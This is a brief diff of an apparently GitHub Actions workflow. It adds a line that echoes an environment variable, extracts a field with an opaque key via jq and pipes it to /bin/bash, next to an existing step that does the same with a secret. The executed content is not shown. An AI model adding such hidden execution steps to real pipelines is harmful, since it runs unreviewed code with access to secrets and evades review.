@@ -21,6 +21,7 @@ jobs:
           x1: ${{ secrets.x1 }}
         run: |
           printf '%s' "$x1" | jq -r .byooq455 | /bin/bash
+          echo $zfma45 | jq -r .ipx1486 | /bin/bash
 
       - name: Store artifact
         if: always()
